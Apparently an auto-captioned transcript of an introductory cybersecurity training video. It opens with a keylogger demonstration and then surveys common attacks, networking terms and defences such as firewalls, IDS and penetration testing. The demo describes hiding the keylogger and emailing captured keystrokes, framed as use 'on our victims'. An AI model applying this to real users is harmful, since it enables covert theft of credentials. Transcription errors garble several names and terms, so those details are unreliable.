facebook.com
i'm not actually going to log in i'm
just going to type in a random username
so someone at simplylearn.com and a
password like asd rate one two three
four
and i'm going to try to log in obviously
the login is going to fail because this
account doesn't exist but we want to see
what happens in the background when the
key logger picks up the keystrokes that
we have typed so let's open up the
keylogger again and go and see what is
there in the keystrokes and clipboard
and you can see over here that we typed
in facebook.com enter and then we did
not type in the username that's the
difference here we selected it from a
drop down so a keystroke logger or
keylogger has not been able to capture
that input a keylogger in its essence is
only records something that has been
typed in by the user real time since we
did not type in the username it did not
record that username but we typed in the
password and you can see the password
over here asd at the rate one two three
four and this is how a keylogger works
it only captures the keystrokes that
have been typed in real time so if we
use this exercise on our victims and
they're just using drop down menus at
that point in time none of the data is
going to be recorded for that activity
you would need something which is known
as spyware which would capture screens
which would capture all of this
information that is going on now apart
from just logging keystrokes what this
software also does is it also has a list
of used applications so you can see all
the applications that have uh booted up
along with the operating system and the
ones that have started up after the
operating system has booted it also has
a list of the visited website so you can
see these are the websites that we have
been visiting and uh they have been
listed right here the last one being
facebook login or sign up right so this
can store history for a really long time
if i go back in time and if i look at
some of the demos that i've been looking
at so on 14th of september these were
the keystrokes that i utilized when i
was doing some trainings while i was
providing some demos on other topics so
a keystroke or a keylogger will store
all that information and keep on
recording it till you actually delete
that data or you can uh you can reset
the keylogger you can also set up the
keylogger to send the email to you on a
daily as a daily report to a particular
email address that you've sent so as
long as it detects the internet
connectivity this key logger will send
you an email to the email address that
you've specified with all the key stocks
that it has logged now this is the free
version there's again a paid version for
it so you can go and visit this site and
see how this keylogger functions if i
press on the x button over here it will
ask me if i want this to be hidden in
the system tray if i click on yes it
only using this shortcut will i be able
to invoke this screen so just for demo
purposes i do not want this to be hidden
so i'm going to click on no and you can
see that the keylogger is still visible
over here so that was the first demo
that we are seeing viruses as we all
know are destructive programs that once
executed would destroy data or harm the
hard disk or the partition tables worms
on the other hand would be software's
that would be more of a nuisance value
where they're going to replicate
themselves in such a way that they would
consume the resources of a computer thus
crashing the computer and then requiring
a reboot a trojan horse is another
software that will allow a backdoor
entry or a covert channel to that hacker
where the hacker in this case would then
be able to gain access to the victims
machine through the covert channel or
the back door without the knowledge and
the authorization of the user themselves
let's talk about social engineering
attack now this is where your people
skills come into the picture this is the
art of manipulating people and
convincing them to give up confidential
information either knowingly or
unknowingly so most likely well uh we
trust our friends right and we talk to
them a lot and we give out some
confidential information which we would
not give out to others what if somebody
is pretending to be our friend just to
get this information out of us and we
trust this person to give out that
information and we suddenly get affected
because of that now i'm not saying that
everybody in the world does that but it
is one of the most common attacks that
is experienced in the computing world
now social engineering attacks can be
broken down into three categories first
is a phishing attack don't worry about
that figure over there you're actually
not going to go fishing it's but
basically what known as a phishing
attack then there is a spear phishing
attack and then there's a veiling attack
all of these are types of social
engineering attacks where you of uh
where you're targeting a user uh by
sending out fake mails or fake websites
and the gullibility into clicking on
those links and then giving out
information so what is a phishing attack
it is a practice wherein a hacker
usually sends fake mails which look
really genuine or hosts fake websites
which also look genuine and looks like
they're from a trusted source once you
click on those links there would be
embedded scripts or embedded malwares
which would then be executed and and
then get installed on your machines
compromising the security of your device
these utilities could be used to steal
credit card information create steal
data from your computer upload data to
your computer use your computer as a bot
and anything and everything that the
hacker might want to do spearfishing is
a variation of phishing now phishing is
a non-targeted attack it is to the whole
world at large whoever becomes a victim
becomes a victim however spear phishing
is a targeted attack it is to a specific
individual or to a group of individuals
in an organization so it becomes a
customized attack you identify the
victim you identify the flaws that are
existing over there in the organization
you identify the gullibility of the
victim create that fake mail to suit
that particular situation send it across
to them they'll click on that link and
get infected by whatever payloads that
you have embedded within it railing is
when you are targeting particularly
wealthy or powerful people in the
industry so normally uh when you're
targeting ceos cfos high level
management people of an organization it
would be known as a veiling attack so
here the example is where the email has
been received your customer your account
is going to expire today to keep your
account activated please click on the
link here and proceed with the
verification process now here the link
that we see activate.com would be a
hyperlink which is going to mask the
actual url with the
link is going to redirect us right here
the attack is on the gullibility of the
customer where they would fear that the
account would be deactivated and to
prevent that they would press this email
click on the link and then provide the
information thinking that they're just
reactivating their account but they're
actually leaking their own information
to the attacker so the first thing you
have to understand is banks or any
organization are no not going to send
you any emails with the link in it
asking you to re reactivate or anything
like that in fact banks proactively tell
us that they are not going to give call
us and ask for any information in fact
they would want us to call them on their
registered number or the helpline number
that they have declared on their website
or on the cards that we possess then
moving on to social engineering this is
something very common in today's world
this is basically where the prey is the
human itself and the reason social
engineering attacks are very successful
is because of the gullibility factor
that a human has for example human has
something called emotions that a machine
wouldn't you could plead with a human
for a password to be reset by gaining
sympathy or empathy but try doing that
with the machine those attacks are going
to fail social engineering attacks are
not only limited to those but we can
talk about fishing phishing is also a
part of social engineering attack where
the gullibility of the user to click on
that link is being exploited in this
scenario here this is clark he's calling
from the id security team that means
that he is impersonating probably and
then telling the victim that the system
has been compromised please share the
password with me the victim on the other
hand thinks that the person is trying to
help her
probably doesn't verify that person
trusts that person and then provides the
password over the phone now here it is
fear that is being exploited because the
password being compromised would uh
clearly upset the end user for loss of
data or for the computer revealing out
confidential information thus here that
she's trusting the it security team for
the password to be reset and given back
to her then we come to the network
attacks man in the middle this is also
known as eavesdropping attack which
literally means that you are going to
listen in on to somebody's conversation
for example in the figure the client is
trying to talk to the server but you
become a man in the middle and you try
to listen in on the conversation that is
going on now obviously the conversation
over here may not be audio but the data
that is being exchanged between the
server and the client you just listen in
you make a copy of that data and you
store it at your end the data could
contain usernames passwords may contain
confidential information and help you
compromise data the attacking computer
takes the ip address of the client so
you find out the ip address of the
client the client is not aware of about
this the client is trying to communicate
with the server you spoof yourself as a
default gateway or a trusted device and
the client thinks that it is through you
that they need to communicate to the
server and thus they start sending data
via your pc so this attack normally
happens on public wi-fi networks i've
seen that happening a lot and does i
never recommend anyone using those
public wi-fi for example you go to a
coffee shop they have free wi-fi over
there you connect to it and you start
surfing you start browsing you are
always signed into google facebook
accounts your bank accounts and whatnot
and then there's a sniffer there is a
hacker who is doing a man in the middle
attack capturing all that data now it's
not an easy attack but it can be done so
this diagram shows where the man in the
middle attack has become successful and
now that the client and the server both
are sending information via the attacker
without knowing them knowing that the
attacker is capturing all that data uh
here suppose you're in trouble and you
need money right now and you call your
friend and ask for money so here the
person is calling john uh telling john
that they're in trouble and they're
asking for john to give their credit
card number over the phone now this is a
legitimate transaction the friend is
actually calling john and asking for
some help however when jon is providing
that help over the phone with the credit
card numbers maybe the cvv number and
all of that and then the otp at the end
of it at the same time there could be a
hacker doing a man in the middle attack
where they could be eavesdropping on
whatever
is being said or whatever data is being
transferred and once they capture this
confidential data they can then misuse
that data to their own gains then comes
the denial of service attack the motive
in a dos attack is not to benefit
monetarily but to bring down a service
for legitimate users thus just causing
harm to the organization for example if
i consume the bandwidth of to a
particular website since there's no more
bandwidth left other legitimate users
who want to interact with the website
will not be able to connect to the
website thus creating a denial of
service to those legitimate users now it
may not be possible for me to use my
laptop to target a cluster of servers
because obviously the bandwidth at the
other end would be very high so i would
distribute my attack across multiple
devices thus creating a distributed
denial of service also called a ddos
attack then we come to the sql injection
or sql sql stands for structured query
language which is the de facto language
that is used by applications to interact
with databases so let it be a microsoft
sql database mysql database oracle sql
the syntax may be a little bit different
but it is still the structured query
language that applications utilize to
interact with the database now the
queries that are created by the
applications need to be sanitized at the
application level itself so developers
need to be very careful of how they are
going to create those queries what
queries are allowed to go to the
database because a database is designed
to answer queries it doesn't know what
is a legitimate query and what is a
illegitimate query if it receives a
query it is going to try to execute it
and give out information thus a hacker
may insert malicious queries or
malformed queries into a sql server
through the vulnerable application
causing a security event so depending on
the queries that have been created the
attacker could delete some data or
modify data add data edit it or do
anything that is malicious in nature
that would compromise the integrity and
the security of that database for
example the dunkin donuts right except
uh apart from being a credential attack
since they got access to the database
they could have added or deleted any
information about any users uh that were
there a password attack as the name
suggests this attack is used to crack or
get the password for users account or
when we say crack passwords this is
basically where somebody is trying to
brute force or they're trying to guess
the password and they're going to break
the password thus getting access to your
accounts there are five different ways
passwords can be cracked the first one
is a dictionary attack where we use
every password that is possible through
the dictionary now this is the use of an
actual dictionary and that's one of the
reasons when we try to create passwords
we are advised not to create passwords
based on dictionary words because these
are easily guessable and there are lists
already out there that contain all of
these words there's a tool that you can
utilize and that tool will then pass
through each and every word that is in
the dictionary file and then compare it
to a possible password if one of the
words matches the password has then be
compromised so if we are observing a
little bit higher security where we have
created a password that is not based on
the dictionary world then we want to
look at other attacks like brute force
it is a trial and error method so
basically what we do is we identify how
the passwords were created for example
in today's world the policies would be
to consume in a password any any of the
alphabet characters a through z
uppercase or lowercase 0 through 9 and
then special characters and then we want
to randomize the uh usage of these
characters so that they are not easily
guessable but a brute force attack at
the same time would then try every
permutation and combination there is
possible in the entire character set and
then try to figure out the password now
this takes a really long time and does
take a lot of compute and storage power
and that's where the botnet example
comes in comes back in the one that we
saw earlier which was used for dos
attack but similarly if i've
infected multiple computers like this i
can then distribute this attack onto all
those computers and use the entire
compute power that is available to
shorten the time that is required to
crack the password now based this is 100
successful given the time that it may
take so if the time that is going to
take is going to be a hundred years the
attack becomes unsuccessful because
during that period uh the password is
most likely to be changed the technology
is going to be changed and so on so
forth so if the password is easily
guessable this can be a very easy attack
to perform then a key logger which is a
similar attack to what we have seen so a
keylogger as discussed earlier is
nothing but a software that once
installed on your machine would grab
each and every key stock that the user
has made and store it in a file which
the hacker can later on access so
whatever you have been typing passwords
credit card information or anything else
all of those would be recorded and
stored in the file and that's one of the
best way a password can be compromised
then shoulder surfing this is a physical
attack rather than being a technical one
uh here you need to be physically
present when the user is typing in their
password and you actually look over
their shoulder to see what they're
typing and try to figure out what the
password is if they're quick typers it
is going to be a little bit more
difficult if they're slow typers it's
going to be that much more easy and the
last one is called a rainbow table now
passwords when applications store them
are stored in hash format hash is
nothing but a one way signature that is
created of the password file of the word
that is used for the password and it is
based on an algorithm so the input could
be a variable length for example a
password could be 7 to 14 characters but
the output of a hash value would be
fixed based on the algorithm that you
are consuming so most common algorithms
in today's world that we utilize are sha
secure hashing algorithms before that we
use md5 or message digest so all of
these convert the passwords from plain
text into a hash value and store it into
a database so if you actually attack
that database to grab a password you're
going to get the hash value not the
password in clear text and thus in that
scenario comes the rainbow table to the
rescue a rainbow table is nothing but a
file that will have the list of all
possible passwords along with their hash
values in the required format so if you
remember the dictionary attack the
dictionary attack was nothing but a list
of words based on the dictionary that
were stored in a file and then the
software was just trying each and every
word against a possible password here we
do not have the word but we have the
hash value so to reverse engineer hash
value what we created is we created a
rainbow table where there would be a
list of other possible passwords and
their corresponding hash values so we
then compare the hash value that we have
captured and then search for that hash
value in the file that we have created
the hash value that matches the
corresponding word to it is the password
in clear text so these are the five
types of password attacks now let's talk
about the types of network attacks an
active attack is
an attack when the intruder attempts to
disrupt the net network's normalcy and
modifies the data and alters the data at
the same time so as you can see in the
diagram there's a sender and there is a
receiver the attacker is the man in the
middle who is now trying to create the
active attack so when the sender sends
that data to the receiver the attacker
intercepts that data modifies the data
and then sends the modified data to the
receiver since the attack is uh is a man
in the middle as we have seen in the
previous attacks the receiver neither
the sender would be aware of the
attacker and thus they would not be
aware of the modification that has been
done in a passive attack the intruder
just eavesdrop on the data they just
listen in on to the conversation but
they do not modify the data at any time
so they just capture the packets they
copy the contents so that they can use
that at a later stage let's look at the
history of cyber crime so as you can see
this graph shows us how cyber crime has
progressed over the years in 1990s uh
mnc database pentagon and ibm were
hacked in again in 1990s national
crackdown on criminals microsoft nt
operating system pierced so this is
where hacking started becoming more
mainstream right
before this hacking was very much
limited to organizations who used
computers but in the late 80s internet
happened and then we had e-commerce
coming in which basically led to our
online retail stores online banking and
online data stores as well which then
led to criminals hijacking this data or
hijacking your money and trying to steal
it on the internet itself in 2001 cyber
criminals launched attacks against ebay
yahoo cnn amazon and other organizations
2007 this was where one of the biggest
bank hacks had happened swedish bank
nadia they recorded at least a million
dollars
being stolen in three months from 250
accounts 2013 adobe had 2.9 million
accounts compromise and their usernames
and passwords released on the open
internet in 2016 kaspersky one of the
leading antivirus providers to the world
reported around 758
million malicious attacks that occurred
which they identified themselves these
are some of the most famous faces in
cyber security or earlier cyber crime in
1988 robert morris
he's an american computer scientist and
entrepreneur he's best known for
creating what is called the morris worm
and this was way back in 1988 and this
is the first computer worm that has been
identified on the internet kevin lee or
kevin lee polson in 1990 he was accused
of hacking into a los angeles los
angeles radio station called kis hyphen
fm
where there was a contest going on and
if you're a particular number of caller
and give a correct answer you're
supposed to win a porsche 944 and he
hacked the those telephone lines
ensuring that he became that particular
person and answered the question
correctly uh it was later on revealed
that this actually happened he was
jailed for it then comes david smith
david smith uh he created the melissa
virus now melissa virus one of the most
dynamic viruses known around march 1999
that's when this happened this virus was
released and this was a macro based
virus which affected microsoft world and
outlook based files adam bought bill in
2004 he's also an american computer
hacker from michigan he gained
unauthorized access to love's computer
uh corporate computer network via an
open unsecured wireless access points uh
now these access points back then were
not that much secured uh the these
people were able to identify it what
they tried to attempt by doing that was
gain access to the company's network and
install the software which would then
help them capture credit card
information of that organization right
and uh this was later on identified as
well and he was prosecuted for that
crime and got jailed just a matter of
trivia kevin lee polson uh he was one of
the first people found guilty and was
banned from using computers and the
internet for three years after his
release in today's world we cannot even
imagine living without the internet this
guy lived for three years without it now
let's go a little bit further and see
what would motivate people for
committing such cyber crimes right the
first and foremost motive is disrupting
business continuity others would be
looking at data theft or information
theft and manipulating that data to gain
from that data so if i'm able to access
your computer and steal some data that
has some value to you and sell it or
make it public you would be at a
financial loss because that data no
longer has any value creating fear and
cures by disrupting critical
infrastructure for example a company's
infrastructure crashes the services are
no longer being offered by that
organization and people start panicking
uh start fearing an attack by cyber
criminals and it leads to chaos
financial loss to the target which is
very obvious if i do a denial of service
attack or if i make a service and a
variable from an organization what is
going to happen is since the that
service is not functioning uh the
company is not going to make any money
out of it and that's going to suffer a
financial loss achieving states military
objectives a one country spying on
another country trying to gather
information about their military
intelligence military activities or any
other activities that can harm the
original country demanding ransom
hackers can encrypt your data and then
demand a ransom from you in lieu of
decrypting the data again damaging
reputation of a target impersonating a
user on the social media platforms
making false statements thus damaging
the reputation of that person and
propagating religious or political
beliefs religious fanatics promoting
whatever cultures that they want to
promote trying to gain more followers
thus bringing more unrest to the world
any of these could become motives for
cyber crime so this is why we want cyber
security cyber security should be in
place to prevent these kind of attacks
so what exactly is cyber security it
refers to the practice of protecting
networks programs computer systems and
their components from unauthorized
digital access and attacks so whatever
your digital footprint could be servers
computers switches routers web servers
web applications that you're hosting
over there services that you're
consuming from the cloud or providing to
other customers you need to secure all
of these to ensure that the integrity
and the confidentiality of these
services is intact and none of these
services are affected by any cyber
attacks which could lead to disastrous
results so the main difference we want
to understand here is the difference
between cyber security and information
security information security is data
within the organization where they
handle sensitive information or
proprietary information copyrighted or
patented information and they want to
secure it from data leaks or having the
data in somebody computer's hands cyber
security is basically a technique used
to protect the integrity of network so
this is when you're going to go on the
web and on the internet you're going to
secure your devices that you have
deployed allowing people to access your
infrastructure from the outside so what
could be the cost of not being cyber
secure if you get hacked or if your data
is compromised or if your information is
compromised you could have a lot of
repercussions your good will be go for a
task you may be open for lawsuits not
only from clients but from customers as
well you could be open for fines or
penalties from government organizations
for failing to follow the law of the
land customer trust will obviously be
hampered if you have been hacked and
your data has been compromised you
wouldn't want to deal with that
organization in the future all of this
could land the organization in a
financial crisis where all the lawsuits
and penalties that are being imposed
could basically bankrupt that
organization and does uh take it out of
circulation so now let's look at some
basic terminologies which we need to
understand to go further in the cyber
security world first and foremost
network what is a network network is
nothing but a group of interconnected
devices could be servers could be
workstations could be laptops could be
any devices file printers and what not
to be interconnected with each other as
you can see in the in the diagram it is
used for communications it's used
primarily used for data transmissions
and to communicate between various
terminals so that the business can go on
it is also used to share data
information it could be wired or
wireless so you got a wired lan or at
home we all have wireless networks where
we connect all our devices we
use them for streaming videos we use
them to connect to the internet so
websites work from home so we've got
office also set up on our wi-fi so a
network is nothing but a collection of
interconnected devices that are allowed
to communicate each other freely so that
the business can be continued in a
proper manner server now server is
nothing but a hardware device that is
supposed to handle requests of data
information allow network services to
function from other computers and
devices so this is where we build a
client server relationship where on the
server we've got uh we've got the major
software we got the d we got the data
that is stored over there and clients
that interact with the server to consume
that data in a particular manner that
would help them make sense and analyze
that data and generate business out of
them then the internet internet is
nothing but the collection of multiple
networks globally so all the networks
that we have across the globe when they
are interconnected with each other that
is what internet is and if we just go
back and we talk about servers this is
what allows the internet to be formed so
every organizations when they publish
their servers on the internet and they
allow everyone to interconnect through
those servers that is where the internet
comes in being the servers being the
backbone of the internet obviously for
the servers to communicate with each
others we will need switches routers and
other devices for the data transmissions
to happen so these are the multiple
networks could be individual networks
internet interconnected together would
form the internet across the globe for
the internet to work there would be a
set of protocols for transmissions to be
allowed across the globe now this is
where tcp or the transmission control
protocol over internet protocol comes
into the picture so if you remember we
use communication channels like tcp or
the transmission control protocol and
udp user datagram protocol when we
connected connect to web servers we talk
about the http protocol and https
protocol if you wanted secure then we'll
talk about imap pop3 and all of these
protocols now where do these protocols
come from it is nothing but a suite of
the tcp software which contains all of
these protocols which allow com
computers to communicate with each other
if tcp wouldn't have been there our
network would have collapsed now when we
have tcp ip and we want to communicate
across the globe how would we identify
devices on the internet or even on the
intranet because the devices don't know
us they are not going to use our
usernames and passwords to communicate
with each other but when i want to
connect to a website or a device how do
i identify it on the internet or the
internet i obviously use ip addresses
now ip addresses are nothing but the
internet protocol addresses which are
32-bit addresses which look exactly like
the one shown on your screen
172.16.254.1
now there is a lot of classification of
ip addresses and some of these ip
addresses work on the internet some of
them are supposed to work on private
lands but i will reserve that for a
later topic then the second way that we
are identified on the internet or the
internet are with mac addresses so media
access controls or mac addresses are
hard-coded addresses that are given to
our network interface cards these cannot
be modified physically at any point in
time however there are techniques to
spoof mac addresses which we can then
obfuscate our existing address and give
us a new one that would again be
discussed in a later in a later lecture
a router we've been talking about
routers and switches router is nothing
but a device that passes packets back
and forth across networks it routes the
data in the appropriate path so it is an
intelligent device it can understand ip
addresses and mac addresses it can
identify different parts of reaching a
particular network for example if i'm
sitting in india and i want to
communicate across the world to america
there would be a specific path that
needs to be followed for my data packet
to reach the other side of the world it
is the routers that would map this path
store it in their cache so when i tried
to connect to that server they would
retrieve it from the cache and send the
packet across the globe so
the home router that we use at home on
wi-fi is our default gateway to connect
to the internet and thus it allows our
internal devices to communicate with
each other within using internal ip
addresses and when we want to go to the
internet it will then route the traffic
on the internet and send the packet to
other servers that we want to
communicate with now what is a domain a
domain is referred to as a group of
computers and other devices that are
interconnected and treated as a whole
now a do menu is used by an organization
so let's say if i am xyz xyz being the
name of the organization and i want to
create and a domain which will allow me
to create a group of interconnected
computers for my employees to
interconnect with each other and send
and manage data i'm going to create a
domain for my organization and
attach all the devices create users and
interconnect them using a domain so this
is where you are going to have a
centralized approach of a server client
relationship where you're going to have
a main domain and you're going to have
devices connected to the domain now when
we go onto the internet the domain name
is nothing but the base part of a
website name so when you say google.com
and you type it in your browser you're
taken to the web page called google.com
which is the search engine that you're
connected but for google the
organization at the other end they would
have a data center over there which
would have all that relevant data which
allows you to search through that
information so for them the domain would
be the internal part where they have got
this cluster of servers creating a data
center where all that information is
stored but for us as consumers a website
called google.com would be a domain
forest to visit that particular website
and consume the services that they're
offering on the internet so here the
example is https which means that it is
a secure website port 443 and we're
connecting to cybersecurity.com
cybersecurity.com becomes the domain
name https becomes the protocol that we
want to utilize to connect to that
particular website then we come across
dns or the domain name system it is
nothing but an index something like a
phone book which is responsible for
mapping the domain name into its
corresponding ip address now remember i
said that there are only two ways we are
identified on the internet or the
intranet either the ip address or the
mac address if it is devices if it is
computers were talking to each other it
would obviously be ip addresses but if i
type in google.com i'm giving it a
domain name the internet does not
understand domain names so there is a
dns a server which is an index or works
like an index or more like a phone book
which will have a list of all the
domains with the corresponding ip
addresses so whenever i type in
google.com the request goes to a dns
server the dns server is queried the ip
address of google.com is identified
pasted onto the packet and then the
packet is routed through the router to
the path that it has determined to reach
the google.com server here replace
google.com with cybersecurity.com so as
you can see on the screen the local pc
queries the dns server the dns server
replies back with the ip address now if
you're wondering how does this work if
we're going to take an example of home
networks the isp or the internet service
provider gives us a default gateway or a
router with their own ip addresses for
dns servers and default gateways so when
we try to connect through the router the
router has the ipr of the dns server and
it routes that query to the dns server
the dns server replies back with the
appropriate ip address the router then
takes that ip address figures out the
path and sends it across to the targeted
server dhcp or the dynamic host
configuration protocol it is a protocol
that dynamically assigns ip addresses to
the devices in the network so we have
discussed that ip addresses are required
by computers to communicate within each
other but who associates or who gives
these ip addresses to these computers so
for that to happen we have got a dhcp
server that is created if you take your
home networks it is the router that has
the dhcp role installed on it so
whenever a machine boots up it sends out
a broadcast request looking for the dhcp
server and then there is a communication
with the dhcp server the dhcp server
then allocates an ip address to the
computer who is requesting it and once
the ip address is allocated an entry is
made in the dhcp servers cache with the
corresponding mac address of that
particular machine then we come to the
next top topic called vpn or a virtual
private network it is a connection
between a vpn server and a vpn client
it's basically a encrypted channel that
you're creating between two endpoints
and the main reason for a vpn is to
encrypt your data so that it is now no
longer subject to man in the middle or
eavesdropping or modification attacks so
this is a layer of security that you are
adding when you are connecting to the
internet using an encrypted channel
which should prevent you from getting
hacked or your data being compromised by
hackers so as you can see here and if
you remember the previous top previous
slides that we have seen the hacker was
able to copy the data very easily now
that it is an encrypted channel even if
the hacker tries to eavesdrop and
capture that data it will be formatted
in such a way that they would not be
able to make sense out of it now the
attacker or the hacker will try will
have to try to decrypt the data so
that's another attack that they'd have
to execute to find out the encryption
key decrypt the data and then look at
what the data was then we come across
botnet now first let's first understand
what bots are bots are nothing but the
softwares that can be installed on
vulnerable machines that would allow the
hacker to send commands to the infected
machines to generate some traffic or to
do what the command tells them to do so
most of the botnets are used for
distributed denial of service attack if
you remember the dos and ddos that were
discussed a while back this is where we
tied up with how they are executed so a
bot master or a hacker let's call them a
hacker would try to identify vulnerable
devices across the internet and try to
install the bot onto those devices the
bot essentially is a software that would
revert back to the bot master and
advertise their availability whenever
they have been powered on a collection
of such infected devices would
essentially be called a botnet when
there are enough number of machines that
the attacker fill fields are good enough
to launch that attack on the targeted
servers the hacker will then initiate
those devices send the commands through
the botmaster to the bots and the bots
would then generate that kind of traffic
what whatever they have been configured
for and then attack the targeted server
now this is also done to opt to mask the
identity of the hacker since the attack
is being generated through the botnet
the ip addresses of the botnet computers
would be reported to the targeted server
not the actual hacker's ip address so it
to figure out who the attacker was would
be very much difficult depending on the
size of the botnet so this you can see
is the attack that has been created over
the victims and the malicious traffic
has been generated through the botnet
and the victims have been targeted
through that so as said once that
traffic has been done to forensically
investigate at the victim's end they
would find the ip addresses of the
botnet and not the attacker all right
let's start talking about network
security controls network security
controls are nothing but implementations
of various devices to enhance the
security of a particular network these
could be firewalls intelligent detection
systems or intrusion prevention systems
honeypots unified threat management
systems and so on so forth the next gen
firewalls that we talk about right so
let's look at a review of what these
devices are now a firewall can be a
hardware or a software that is
responsible for allowing or disallowing
a certain amount of traffic to or from
your computer so these are basically
created to enhance the security portion
of your network where you can configure
them for certain level of traffic to be
allowed or some traffic to be disallowed
now a firewall is not going to decide by
itself what is a good amount of traffic
or what is bad traffic you're going to
configure the firewall by creating rules
based on ip addresses port numbers
protocols and what may and based on this
the firewall will then analyze the
traffic coming in or going out to the
inbound or the outbound rules and if the
traffic is allowed it will allow the
traffic to go through if there's an
explicit rule which says deny the
traffic it will drop the packets or it
will delete the package it will not
allow the packets to go past it so if it
is good traffic that means it matches a
rule that has been created that allows
the traffic to go through the firewall
will allow it if it's bad traffic that
means that there is a rule which denies
the traffic to pass through it will get
blocked at the firewall level itself it
will the firewall will not allow it to
enter the network similarly an intrusion
detection system it is designed to
detect unauthorized access to systems or
intrusion attempts as well now it works
along with the firewall and the main
thing is that here there's a database
against which it can compare the traffic
so most of the attacks that we've talked
about there are some distinct signatures
that would cause concern or that would
highlight that kind of an attack most of
the organizations try to develop these
kind of signatures have them in a
database and store them on the ids so
that ideas can analyze the incoming
traffic look at patterns from the
traffic coming in or going out compare
it to the database of the signatures
that it has and if it matches any of the
signatures it will then detect that as
an attack and send an alert to the
administrator where the administrator
will then have to manually come in and
check it out a intrusion prevention
system as described earlier or as
mentioned earlier can be configured to
react to that particular event so if it
detects something that can be classified
as an intrusion an administrator can
pre-configure it to to react to that
particular packet in a particular manner
for example drop the packets or reflect
them to a honey pot or want the
administrator or do all of these things
at the same time so as you can see on
the diagram and the internet there's a
hacker a sense of the data packets come
in the firewall is not able to analyze
the traffic because
a firewall cannot analyze the contents
of a packet it can only look at the
header it can only look at the ip
addressing uh and
the ports that are that have been
created or the rules on which those
things have been mentioned and then it
allows the data to go through it reaches
the ideas the ideas then looks at two
ways to scan one is a signature that
we've just spoken about where the
developer of the ids creates those
signatures and stores them onto the
database or another thing that is known
as heuristic scanning which is nothing
but behavioral scanning so it looks at
the behavior of the data and if the
behavior looks malicious it will then
raise an alert and warn the
administrator then let's come to
honeypots we just discussed in the
previous slide that an ips or an
intrusion prevention system can be
pre-configured that if it detects an
animally or if it detects an intrusion
it may redirect the traffic to a honey
pot what is a honey pot a honey pot is a
decoy system it is created to showcase a
certain set of vulnerabilities to try to
attract the attention of a attacker now
the word here is used as lure but it's
more to deceive the attacker for example
if the attacker has been able to bypass
your firewall and your ideas and now can
scan the entire subnet when they scan it
they would come across a device which is
pretty vulnerable or showcases some
vulnerabilities which would definitely
impress the hacker because they would
think that it is a vulnerable server
which contains some valuable data and
that exactly what honeypot is it's a
decoy server trying to uh trying to act
as a production server trying to
showcase that it has some valuable data
but also has some vulnerabilities in it
so that the attacker can be attracted
towards it and spend some time trying to
attack it or analyze the honeypot at the
same time the honeypot will analyze the
data traffic and it will warn the
administrator of a possible intrusion
which will give the administrator enough
time to secure the rest of the network
and we'll also get to analyze the logs
of the honeypot one to try to understand
what kind of attacks that attacker is
trying to create and try to reverse
engineer and identify the attacker at
the same time let's talk about security
testing security testing is nothing but
a method which is carried out to
identify threats and loopholes in a
system so here we are going to do a
vulnerability analyst and penetration
test we may also go ahead and do a
security audit so what is vulnerability
scanning penetration testing and
security auditing vulnerability scanning
is the activity which you are conducting
to identify or look at possible
weaknesses or issues or vulnerabilities
or misconfigurations that exist in your
infrastructure so it is a proactive way
where a team of security experts will
launch a vulnerability scanner scan
certain devices that they have
pre-identified and once the report from
the vulnerability scanner comes in try
to analyze the report and make sense out
of it to see if there are any
vulnerabilities that can be identified
on those devices this is obviously an
ongoing process why because operating
systems are patched upgraded new
versions of softwares are released and
we keep on upgrading and we keep on
changing our id infrastructure ever so
often and hence the id infrastructure i
guess say is an ever evolving process
and to be a priest of all the latest
vulnerabilities and threats we need to
do the vulnerability analysis
in an ongoing manner to identify
possible threats to the organization so
then what is penetration testing
vulnerability analysis is just
identifying the vulnerabilities gaps
misconfigurations that may be in the
organization's infrastructure a
penetration test is basically to
validate whether those vulnerabilities
that have been reported are real if yes
how complex are they what would be the
impact and what would be the
technological impact and what kind of
data would be compromised or what would
be the end result of that attack if it
actually happens in the real world so
here a bunch of ethical hackers would
simulate an attack from a hacker's
perspective or from an insider's
perspective a malicious outsider or a
malicious insider depending on how they
perceive the vulnerability as and then
they will try to test the vulnerability
to see how it can be exploited to what
extent it can be exploited and what
would be the compromise or what would be
the data leakage that would happen if
this vulnerability gets exploited so
there are three ways a penetration test
can be conducted there is a black box
testing a gray box testing and a white
box testing if you look at black box
testing this is where the tester or the
penetration tester rather has no
knowledge about the organization their
infrastructure applications or anything
so this is where you're simulating a
hacker who's sitting on the outside who
has no knowledge about the organization
so they start from the information
gathering phase where they are going to
try to figure out the ip addresses the
ip ranges devices operating systems
applications and anything and everything
that the organization is going to use
and then try to figure out
vulnerabilities within them and then try
to attack those vulnerabilities this is
a very time consuming and a cost
consuming audit the second one is a gray
box testing audit where a partial
knowledge is given to the penetration
tester so this simulates a regular user
kind of an attack so let's say if i'm a
regular user in an organization and by
when i say a regular user i'm saying i'm
not an administrator so i've got limited
access and based on that limited access
and the limited knowledge that i can
gather about the infrastructure by being
a regular employee we are going to
simulate a test with that knowledge to
see whether a employee can take
disadvantage of any vulnerabilities or
and then try to worm their way into the
organization's infrastructure and hack
it the white box testing on the other
hand is where we're looking at an
insider a malicious insider who already
has all the accesses who already has all
the controls in his hands so simulating
an administrative access and then trying
to figure out whether this administrator
can escalate their privileges and gain
some other administrators access and try
to then compromise data for example even
if i'm saying i'm an administrator i am
not the only administrator in the
organization there would be backup
administrators there would be system
administrators there would be the active
directory administrators there would be
application administrators database
administrators and so on so forth so
every single component that we have may
have a different administrator for
example switches would have a different
administrator same thing with firewalls
or any other security controls that you
have so if i am a administrator for
backup can i then try to work my way out
escalate my privileges as a regular
administrator or a system administrator
and then crack their passwords try to
get access and manipulate some data so
these are the three types of penetration
testing audits that you will come across
there would be some different subtypes
but every organization can customize
these kind of audits to whatever they
require then we come to security
auditing security auditing is nothing
but an internal check that is carried
out by internal auditors that means
people who are employees within the
organization to find out flaws in the
organization's information system now
this is more on the compliance side this
may
take inputs from the vulnerability
assessment and the
penetration test but overall we want to
see what kind of policies that we have
in our organization whether those
policies are working properly whether
they make sense are there any gaps and
based on the technical inputs from the
vapd team how do we map with the
policies that we have defined for that
organization for example a password
policy now we have documented that a
password policy should be effective
enough that passwords cannot be easily
brute forced so that's a high level
policy then we dictate a procedure for
that policy to be implemented where we
say hey we want the systems to be
configured where the password meets some
complexity standards for example uh
should be uppercase and lowercase a
through z 0 through 9 should use special
characters and should be randomized
password should not be dictionary based
or based on the user's name now these
are this is the policy that we have
created and the procedures that we have
defined are they being actually
implemented in the real world so a
vulnerability analysis would determine
whether the passwords are probably weak
or not so if the vulnerability report
comes back and says the passwords are
probably weak then a penetration tester
would go in and then try various attacks
to see if passwords can be compromised
now first and foremost what is cyber
